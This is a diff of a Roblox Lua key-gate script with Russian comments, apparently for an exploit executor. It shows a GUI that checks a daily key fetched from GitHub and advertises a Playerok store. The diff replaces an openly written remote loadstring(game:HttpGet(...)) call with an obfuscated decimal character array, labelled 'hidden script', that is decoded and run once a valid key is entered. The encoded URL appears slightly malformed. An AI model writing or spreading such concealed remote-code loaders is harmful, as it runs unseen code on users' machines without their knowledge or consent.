@@ -1,126 +1,179 @@
-local T=game:GetService("TweenService")
-local R=game:GetService("RunService")
-local C=game:GetService("CoreGui")
-local H=game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
 
-local old=C:FindFirstChild("PlayerokKeyGui")
-if old then old:Destroy() end
+-- Удаляем старый GUI
+local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
+if oldGui then oldGui:Destroy() end
 
-local url="https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
-local ok,res=pcall(function() return game:HttpGet(url) end)
-local keys={}
-if ok then keys=H:JSONDecode(res) else warn("Не удалось загрузить ключи") end
+-- Загружаем ключи
+local keysURL = "https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
+local success, response = pcall(function() return game:HttpGet(keysURL) end)
+local keys = {}
+if success then keys = HttpService:JSONDecode(response) end
 
-local today=os.date("%Y-%m-%d")
-local tKey=keys[today]
-local vKey=nil
-if tKey then vKey=table.concat(tKey:map(function(v)return string.char(v)end)) end
+local today = os.date("%Y-%m-%d")
+local todayKeyTable = keys[today]
+local validKey = nil
+if todayKeyTable then
+    validKey = ""
+    for _, v in ipairs(todayKeyTable) do
+        validKey = validKey .. string.char(v)
+    end
+end
 
-local g=Instance.new("ScreenGui")
-g.Name="PlayerokKeyGui"
-g.ResetOnSpawn=false
-g.Parent=C
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "PlayerokKeyGui"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
 
-local f=Instance.new("Frame",g)
-f.Size=UDim2.new(0,0,0,0)
-f.Position=UDim2.new(0.5,0,0.4,0)
-f.AnchorPoint=Vector2.new(0.5,0.5)
-f.BackgroundColor3=Color3.fromRGB(120,140,255)
-Instance.new("UICorner",f).CornerRadius=UDim.new(0,20)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 0, 0, 0)
+frame.Position = UDim2.new(0.5, 0, 0.4, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
 
-local grad=Instance.new("UIGradient",f)
-grad.Color=ColorSequence.new{
-    ColorSequenceKeypoint.new(0,Color3.fromRGB(120,140,255)),
-    ColorSequenceKeypoint.new(1,Color3.fromRGB(200,220,255))
+-- Градиент
+local grad = Instance.new("UIGradient", frame)
+grad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 140, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 220, 255))
 }
-grad.Rotation=45
+grad.Rotation = 45
 
-local t=Instance.new("TextLabel",f)
-t.Size=UDim2.new(1,-20,0,40)
-t.Position=UDim2.new(0,10,0,60)
-t.BackgroundTransparency=1
-t.Text="🔐 Введите ключ от Playerok"
-t.TextColor3=Color3.new(1,1,1)
-t.Font=Enum.Font.GothamBold
-t.TextSize=22
+-- Заголовок
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, -20, 0, 40)
+title.Position = UDim2.new(0, 10, 0, 60)
+title.BackgroundTransparency = 1
+title.Text = "🔐 Введите ключ от Playerok"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
 
-local b=Instance.new("TextBox",f)
-b.Size=UDim2.new(0.8,0,0,36)
-b.Position=UDim2.new(0.1,0,0,110)
-b.PlaceholderText="Вставьте ключ..."
-b.Font=Enum.Font.Gotham
-b.TextSize=20
-b.TextColor3=Color3.fromRGB(50,50,50)
-b.BackgroundColor3=Color3.fromRGB(230,230,255)
-Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)
+-- Поле ввода
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(0.8, 0, 0, 36)
+box.Position = UDim2.new(0.1, 0, 0, 110)
+box.PlaceholderText = "Вставьте ключ..."
+box.Font = Enum.Font.Gotham
+box.TextSize = 20
+box.TextColor3 = Color3.fromRGB(50, 50, 50)
+box.BackgroundColor3 = Color3.fromRGB(230, 230, 255)
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
 
-local btn=Instance.new("TextButton",f)
-btn.Size=UDim2.new(0.8,0,0,40)
-btn.Position=UDim2.new(0.1,0,0,160)
-btn.BackgroundColor3=Color3.fromRGB(160,200,255)
-btn.Font=Enum.Font.GothamBold
-btn.TextSize=20
-btn.TextColor3=Color3.fromRGB(30,30,30)
-btn.Text="Проверить"
-Instance.new("UICorner",btn).CornerRadius=UDim.new(0,12)
+-- Кнопка проверки
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0, 160)
+button.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 20
+button.TextColor3 = Color3.fromRGB(30, 30, 30)
+button.Text = "Проверить"
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
 
-local fb=Instance.new("TextLabel",f)
-fb.Size=UDim2.new(1,0,0,20)
-fb.Position=UDim2.new(0,0,0,145)
-fb.BackgroundTransparency=1
-fb.Text=""
-fb.TextColor3=Color3.new(1,1,1)
-fb.Font=Enum.Font.Gotham
-fb.TextSize=18
+-- Подсказки
+local feedback = Instance.new("TextLabel", frame)
+feedback.Size = UDim2.new(1, 0, 0, 20)
+feedback.Position = UDim2.new(0, 0, 0, 145)
+feedback.BackgroundTransparency = 1
+feedback.Text = ""
+feedback.TextColor3 = Color3.new(1, 1, 1)
+feedback.Font = Enum.Font.Gotham
+feedback.TextSize = 18
 
-local pbBG=Instance.new("Frame",f)
-pbBG.Size=UDim2.new(0.8,0,0,20)
-pbBG.Position=UDim2.new(0.1,0,0,260)
-pbBG.BackgroundColor3=Color3.fromRGB(200,200,255)
-Instance.new("UICorner",pbBG).CornerRadius=UDim.new(0,10)
+-- Кнопка копирования ссылки
+local getKeyButton = Instance.new("TextButton", frame)
+getKeyButton.Size = UDim2.new(0.8, 0, 0, 36)
+getKeyButton.Position = UDim2.new(0.1, 0, 0, 210)
+getKeyButton.BackgroundColor3 = Color3.fromRGB(180, 220, 255)
+getKeyButton.Font = Enum.Font.GothamBold
+getKeyButton.TextSize = 18
+getKeyButton.TextColor3 = Color3.fromRGB(20, 20, 20)
+getKeyButton.Text = "Получить ключ"
+Instance.new("UICorner", getKeyButton).CornerRadius = UDim.new(0, 12)
 
-local pb=Instance.new("Frame",pbBG)
-pb.Size=UDim2.new(0,0,1,0)
-pb.BackgroundColor3=Color3.fromRGB(30,200,30)
-Instance.new("UICorner",pb).CornerRadius=UDim.new(0,10)
+getKeyButton.MouseButton1Click:Connect(function()
+    setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
+    feedback.Text = "✅ Ссылка скопирована!"
+    feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
+end)
 
-local function tweenIn(inst,dur,target)
-    T:Create(inst,TweenInfo.new(dur,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=target}):Play()
+-- Прогресс-бар
+local progressBackground = Instance.new("Frame", frame)
+progressBackground.Size = UDim2.new(0.8, 0, 0, 20)
+progressBackground.Position = UDim2.new(0.1, 0, 0, 260)
+progressBackground.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
+Instance.new("UICorner", progressBackground).CornerRadius = UDim.new(0, 10)
+
+local progressBar = Instance.new("Frame", progressBackground)
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
+Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 10)
+
+-- Скрытый скрипт
+local scriptNumbers = {108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,109,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,51,49,51,55,98,97,52,57,52,101,98,99,102,48,40,41,41,40,41}
+
+local function runHiddenScript()
+    local code = ""
+    for _, num in ipairs(scriptNumbers) do
+        code = code .. string.char(num)
+    end
+    local success, err = pcall(function()
+        loadstring(code)()
+    end)
+    if not success then
+        warn("Ошибка при запуске скрытого скрипта: ", err)
+    end
 end
-tweenIn(f,0.5,UDim2.new(0,400,0,320))
 
-local function pulse(btn)
-    T:Create(btn,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Size=UDim2.new(0.82,0,0,42)}):Play()
+-- Анимации
+local function tweenIn(instance, duration, targetSize, targetPos)
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    TweenService:Create(instance, tweenInfo, {Size = targetSize}):Play()
+    TweenService:Create(instance, tweenInfo, {Position = targetPos}):Play()
 end
-pulse(btn)
+tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 320), frame.Position)
 
-local function fillAndLoad()
-    local dur=2
-    local start=tick()
+-- Пульсация кнопки
+local function pulseButton(btn)
+    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    TweenService:Create(btn, tweenInfo, {Size = UDim2.new(0.82, 0, 0, 42)}):Play()
+end
+pulseButton(button)
+
+-- Проверка ключа
+local function fillProgressBarAndRunScript()
+    local duration = 2
+    local startTime = tick()
     local conn
-    conn=R.RenderStepped:Connect(function()
-        local elapsed=tick()-start
-        local pct=math.clamp(elapsed/dur,0,1)
-        pb.Size=UDim2.new(pct,0,1,0)
-        if pct>=1 then
+    conn = RunService.RenderStepped:Connect(function()
+        local elapsed = tick() - startTime
+        local pct = math.clamp(elapsed / duration, 0, 1)
+        progressBar.Size = UDim2.new(pct, 0, 1, 0)
+        if pct >= 1 then
             conn:Disconnect()
-            g:Destroy()
-            loadstring(game:HttpGet("https://gist.githubusercontent.com/UCT-hub/5b11d10386f1b8ce08feb803861e0b79/raw/b2917b398d4b0cc80fb2aca73a3137ba494ebcf0/gistfile1.txt"))()
+            gui:Destroy()
+            runHiddenScript()
         end
     end)
 end
 
-btn.MouseButton1Click:Connect(function()
-    local input=b.Text:match("^%s*(.-)%s*$")
-    if not vKey then
-        fb.Text="⚠️ Ключ на сегодня не найден"
-        fb.TextColor3=Color3.fromRGB(255,170,0)
-    elseif input==vKey then
-        fb.Text="✅ Ключ верный, загружаем..."
-        fb.TextColor3=Color3.fromRGB(30,200,30)
-        fillAndLoad()
+button.MouseButton1Click:Connect(function()
+    local input = box.Text:match("^%s*(.-)%s*$")
+    if not validKey then
+        feedback.Text = "⚠️ Ключ на сегодня не найден"
+        feedback.TextColor3 = Color3.fromRGB(255, 170, 0)
+    elseif input == validKey then
+        feedback.Text = "✅ Ключ верный, загружаем..."
+        feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
+        fillProgressBarAndRunScript()
     else
-        fb.Text="❌ Неверный ключ"
-        fb.TextColor3=Color3.fromRGB(200,40,40)
+        feedback.Text = "❌ Неверный ключ"
+        feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
     end
 end)
